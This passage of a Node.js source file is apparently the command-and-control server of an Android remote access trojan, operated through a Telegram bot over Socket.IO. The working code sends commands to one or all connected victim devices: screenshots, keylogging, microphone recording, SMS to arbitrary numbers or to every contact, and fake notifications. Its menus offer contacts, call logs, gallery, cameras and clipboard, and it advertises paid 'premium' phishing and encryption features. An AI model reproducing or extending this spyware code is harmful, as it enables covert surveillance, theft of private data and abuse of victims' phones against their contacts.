        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      });
    }

    // Screenshot
    if (messageText === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "screenshot", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "screenshot",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Toast - requires input
    if (messageText === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
      appData.set("currentAction", "toast");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // Keylogger ON
    if (messageText === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "keylogger-on", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "keylogger-on",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Keylogger OFF
    if (messageText === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "keylogger-off", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "keylogger-off",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      });
    }

    // Open URL
    if (messageText === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚄𝚁𝙻</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
    }

    // Microphone - requires duration
    if (messageText === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
      appData.set("currentAction", "microphoneDuration");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // Vibrate - requires duration
    if (messageText === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
      appData.set("currentAction", "vibrateDuration");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // Send SMS - requires number
    if (messageText === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
      appData.set("currentAction", "sendSms");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // SMS to all contacts - requires text
    if (messageText === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
      appData.set("currentAction", "smsToAllContacts");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // Pop Notification - requires text
    if (messageText === "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯") {
      appData.set("currentAction", "popNotification");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }

    // Premium features (Phishing, Encrypt, Decrypt, Apps, File Explorer)
    if (
      [
        "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯",
        "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯",
        "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯",
        "✯ 𝙰𝚙𝚙𝚜 ✯",
        "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯",
      ].includes(messageText)
    ) {
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Clipboard, Play Audio, Stop Audio
    if (
      ["✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"].includes(
        messageText,
      )
    ) {
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      });
    }
  } else {
    // Check if message is a device selection
    io.sockets.sockets.forEach((socket, socketId, socketMap) => {
      if (messageText === socket.model) {
        appData.set("currentTarget", socketId);
        bot.sendMessage(
          data.id,
          `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${socket.model}</b>\n\n`,
          {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [
                ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
                ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
                ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
                ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯"],
                ["✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
                ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
                ["✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯"],
                ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
                ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
                ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
                ["✯ 𝙰𝚙𝚙𝚜 ✯"],
                ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
                ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
              ],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          },
        );
      }
    });

    // Handle 'all' selection
    if (messageText === "✯ 𝙰𝚕𝚕 ✯") {
      appData.set("currentTarget", "all");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
              ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
              ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯"],
              ["✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
              ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
              ["✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
              ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
              ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
              ["✯ 𝙰𝚙𝚙𝚜 ✯"],
              ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
              ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
            ],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }
  }
});

// =======================
// PERIODIC TASKS
// =======================

// Ping all devices every 5 seconds
setInterval(() => {
  io.sockets.sockets.forEach((socket, socketId, socketMap) => {
    io.to(socketId).emit("ping", {});
  });
}, 5000);

// Keep server alive by pinging itself every 5 minutes
setInterval(() => {
  https.get(data.url, (response) => {}).on("error", (err) => {});
}, 300000);

// =======================
// START SERVER
// =======================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`listening on port ${PORT}`);
});
